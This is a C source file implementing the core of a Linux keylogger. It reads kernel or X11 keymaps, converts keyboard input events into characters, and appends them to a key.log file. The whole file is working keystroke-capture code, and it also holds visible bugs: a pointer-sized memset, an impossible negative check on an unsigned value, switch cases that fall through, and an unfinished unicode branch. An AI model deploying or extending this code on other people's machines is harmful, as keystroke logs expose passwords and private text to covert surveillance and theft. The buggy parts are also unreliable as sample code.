
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/keyboard.h>
#include <linux/kd.h>
#include <linux/input.h>
#include <xkbcommon/xkbcommon.h>
#include <xkbcommon/xkbcommon-x11.h>
#include <xcb/xcb.h>

#include "io.h"
#include "logkeys.h"
#include "main.h"
#include "mbuffer.h"

#define PREFIX char
#define T char
#include "mbuffertemplate.h"

static int load_x_keymaps ( const char screen[], struct keyboardInfo *kbd, struct configInfo *config )
{
        int err = 0;

        kbd->x.con = xcb_connect ( screen, NULL );
        if ( kbd->x.con == NULL ) {
                LOG ( -1, "xcb_connect failed!\n" );
                err = -2;
                goto error_exit;
        }

        if ( xcb_connection_has_error ( kbd->x.con ) ) {
                LOG ( -1, "xcb_connection_has_error failed!\n" );
                err = -3;
                goto error_exit;
        }

        {
                uint16_t major_xkb, minor_xkb;
                uint8_t event_out, error_out;
                if ( !xkb_x11_setup_xkb_extension ( kbd->x.con, XKB_X11_MIN_MAJOR_XKB_VERSION, XKB_X11_MIN_MINOR_XKB_VERSION, 0, &major_xkb, &minor_xkb, &event_out, &error_out ) ) {
                        LOG ( -1, "xkb_x11_setup_xkb_extension failed with %d! -> major_xkb %d minor_xkb %d\n", error_out, major_xkb, minor_xkb );
                        err = -4;
                        goto error_exit;
                }
        }

        kbd->x.device_id = xkb_x11_get_core_keyboard_device_id ( kbd->x.con );
        if ( kbd->x.device_id == -1 ) {
                LOG ( -1, "xkb_x11_get_core_keyboard_device_id failed!\n" );
                err = -5;
                goto error_exit;
        }

        kbd->x.keymap = xkb_x11_keymap_new_from_device ( kbd->x.ctx, kbd->x.con, kbd->x.device_id, XKB_KEYMAP_COMPILE_NO_FLAGS );
        if ( !kbd->x.keymap ) {
                LOG ( -1, "xkb_x11_keymap_new_from_device failed!\n" );
                err = -6;
                goto error_exit;
        }

        return err;

error_exit:
        config->xkeymaps = false;
        return err;
}

static int load_kernel_keymaps ( const int fd, struct keyboardInfo *kbd, struct configInfo *config )
{
        size_t i, k;

        memset_s ( kbd->k.keycode, MAX_SIZE_FUNCTION_NAME, 0 );

        for ( i = 0; i < MAX_SIZE_SCANCODE; i++ ) {
                struct kbkeycode temp;

                temp.scancode = i;

                if ( ioctl ( fd, KDGETKEYCODE, &temp ) ) {
                        ERR ( "ioctl" );
                        return -1;
                }

                kbd->k.keycode[temp.scancode] = temp.keycode;
        }

        memset_s ( kbd->k.actioncode, MAX_NR_KEYMAPS, 0 );

        for ( i = 0; i < MAX_NR_KEYMAPS; i++ ) {
                for ( k = 0; k < NR_KEYS; k++ ) {
                        struct kbentry temp;

                        temp.kb_table = i;
                        temp.kb_index = k;

                        if ( ioctl ( fd, KDGKBENT, &temp ) ) {
                                ERR ( "ioctl" );
                                return -2;
                        }

                        kbd->k.actioncode[i][k] = temp.kb_value;
                }

        }

        memset_s ( kbd->k.string, 1024, 0 );

        for ( i = 0; i < 1024; i++ ) {
                struct kbsentry temp;

                temp.kb_func = i;

                if ( ioctl ( fd, KDGKBSENT, &temp ) ) {
                        ERR ( "ioctl" );
                        return -3;
                }

                memcpy_s ( kbd->k.string[i], MAX_SIZE_KBSTRING, temp.kb_string, MAX_SIZE_KBSTRING );
        }

        return 0;
}

int init_keylogging ( const char input[], struct keyboardInfo *kbd, struct configInfo *config )
{
        int err = 0;
        memset_s ( kbd, sizeof ( kbd ), 0 );

        kbd->x.ctx = xkb_context_new ( XKB_CONTEXT_NO_FLAGS );
        if ( !kbd->x.ctx ) {
                LOG ( -1, "xkb_context_new failed!\n" );
                err = -1;
                goto error_exit;
        }

        if ( config->xkeymaps ) {
                if ( load_x_keymaps ( input, kbd, config ) ) {
                        LOG ( -1, "init_xkeylogging failed!\n" );
                }
        }

        if ( !config->xkeymaps ) {
                int fd;

                fd = open ( "/dev/console", O_NOCTTY | O_RDONLY );
                if ( fd < 0 ) {
                        ERR ( "open" );
                        err = -2;
                        goto error_exit;
                }

                if ( load_kernel_keymaps ( fd, kbd, config ) ) {
                        LOG ( -1, "init_kernelkeylogging failed!\n" );
                        err = -3;
                        goto error_exit;
                }
        }

        {
                const char file[] = {"/key.log"};
                char path[sizeof ( config->logpath ) + sizeof ( file )];

                strcpy_s ( path, sizeof ( path ), config->logpath );
                strcat_s ( path, sizeof ( path ), file );

                kbd->outfd = open ( path, O_WRONLY | O_APPEND | O_CREAT | O_NOCTTY );
                if ( kbd->outfd < 0 ) {
                        ERR ( "open" );
                        err = -4;
                        goto error_exit;
                }
        }

        return err;

error_exit:
        config->logkeys = false;
        LOG ( 0, "Turning of keylogging because the init of both the kernel keymaps and libxkbcommon failed!\n" );
        return err;
}


int deinit_keylogging ( struct keyboardInfo *kbd, struct configInfo *config )
{
        if ( close ( kbd->outfd ) ) {
                ERR ( "close" );
        }

        if ( config->xkeymaps ) {
                xkb_keymap_unref ( kbd->x.keymap );
                xkb_context_unref ( kbd->x.ctx );
                xcb_disconnect ( kbd->x.con );
        }
        return 0;
}

enum {
        KEY_STATE_RELEASE = 0,
        KEY_STATE_PRESS = 1,
        KEY_STATE_REPEAT = 2,
};

/*

KEY_... are scancode
string table is for function keys only
KVAL() returns the value KTYP() returns the table of a keycode?

getfd is a function which searches for a console
diacs or compose keys are accent keys

 */

// translate scancode to string
static int interpret_keycode ( struct managedBuffer *buff, struct deviceInfo *device, struct keyboardInfo *kbd, unsigned int code, uint8_t value )
{
        uint8_t modmask = 0;
        if ( code < 0 ) { // is not valid
                return -1;
        }

        LOG ( 1, "keycode:%d value:%d - typ:%d val:%d\n", code, value, KTYP( code ), KVAL( code ));
		
    	// Capslock / CtrlR / CtrlL / ShiftR / ShiftL / Alt / Control / AltGr / Shift 
		switch ( code ) { //  (1 <= scancode <= 88) -> keycode == scancode
        case KEY_RIGHTSHIFT:
        case KEY_LEFTSHIFT:
				if ( code == KEY_RIGHTSHIFT) {
						modmask |= 1 << 5;
				} else {
						modmask |= 1 << 4;
				}
                modmask |= 1;
                break;

        case KEY_RIGHTCTRL:
        case KEY_LEFTCTRL:
				if ( code == KEY_RIGHTCTRL) {
						modmask |= 1 << 7;
				} else {
						modmask |= 1 << 6;
				}
                modmask |= 1 << 2;
                break;
			
		case KEY_RIGHTALT:
		case KEY_LEFTALT:
				modmask |= 1 << 3;
				
		/*case ??: //TODO
				modmask |= 1 << 1;*/
				
		case KEY_CAPSLOCK:
				modmask |= 1 << 8;
        }

        if ( value ) { // change modifier state
                device->kstate |= modmask;
        } else {
                device->kstate &= ( 0xffff ^ modmask );
        }

        if ( !modmask ) { // not a mod key
				if (value == KEY_STATE_PRESS) {
						if ( code < 0x1000 ) { // is not unicode
								unsigned short actioncode;

								switch ( KTYP ( code ) ) {
								case KT_META:
										return 0;
										break;

								default:
										actioncode = kbd->k.actioncode[device->kstate][kbd->k.keycode[code]];
										break;
								}

								LOG(1, "actioncode:%d -> %c\n", actioncode, KVAL(actioncode));
								m_append_member_char ( buff, KVAL(actioncode) );

						} else { // unicode
								//code ^= 0xf000;
								// TODO
						}
				}
                
        } else {
				char *bin = binexpand(device->kstate, 8);
				
				LOG(1, "kstate:%s\n", bin );
				free(bin);
		}
        return 0;
}

int logkey ( struct keyboardInfo *kbd, struct deviceInfo* device, struct input_event event, struct configInfo *config )
{
        if ( config->xkeymaps ) {
                xkb_keycode_t keycode = event.code + 8;

                if ( event.value == KEY_STATE_REPEAT && !xkb_keymap_key_repeats ( kbd->x.keymap, event.code ) ) {
                        return 0;
                }

                if ( event.value != KEY_STATE_RELEASE ) {
                        size_t size;
						
                        xkb_state_update_key ( device->xstate, keycode, XKB_KEY_DOWN );

                        size = xkb_state_key_get_utf8 ( device->xstate, keycode, NULL, 0 ) + 1;
                        if ( size > 1 ) {
                                char *buffer;

                                buffer = malloc ( size );
                                if ( buffer == NULL ) {
                                        ERR ( "malloc" );
                                        return -1;
                                }

                                xkb_state_key_get_utf8 ( device->xstate, keycode, buffer, size );

                                if ( m_append_array_char ( &device->devlog, buffer, size - 1 ) ) { // dont copy \0
                                        LOG ( -1, "append_mbuffer_array_char failed!\n" );
                                        return -2;
                                }
                                free ( buffer );

                        } else if ( size != 1 ) {
                                LOG ( -1, "Keyevent without valid key in map (%d)!\n", keycode );
                        }
                } else if (event.value == KEY_STATE_RELEASE) {
                        xkb_state_update_key ( device->xstate, keycode, XKB_KEY_UP );
				}
 
        } else {
				
				if ( interpret_keycode ( &device->devlog, device, kbd, event.code, event.value ) ) {
						LOG ( 1, "codetoksym failed!\n" );
				}
				printf("\n");
        }

        return 0;
}

